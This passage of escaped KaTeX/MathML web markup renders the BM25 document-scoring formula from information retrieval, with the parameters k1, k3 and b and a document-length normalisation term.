;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;RSV_d = \sum_{ t\in q}log(\frac{N}{df_t})*\frac{(k_1+1)tf_{td}}{k_1((1-b)+b*\frac{L_d}{L_{ave}})+tf_{td}}*\frac{(k_3+1)tf_{tq}}{k_3+tf_{tq}}
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.746443em;vertical-align:-1.386113em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-limits&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.0500050000000003em;&#34;&gt;&lt;span style=&#34;top:-1.8999949999999999em;margin-left:0em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mrel mtight&#34;&gt;∈&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.050005em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span&gt;&lt;span class=&#34;mop op-symbol large-op&#34;&gt;∑&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.386113em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.36033em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8804400000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.656291em;vertical-align:-1.229291em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.427em;&#34;&gt;&lt;span style=&#34;top:-2.215809em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.894191em;&#34;&gt;&lt;span style=&#34;top:-2.655em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.16454285714285719em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;e&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.41586em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3448em;&#34;&gt;&lt;span style=&#34;top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15122857142857138em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.44509999999999994em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.229291em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.399108em;vertical-align:-0.972108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.427em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.28055599999999997em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.28055599999999997em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; 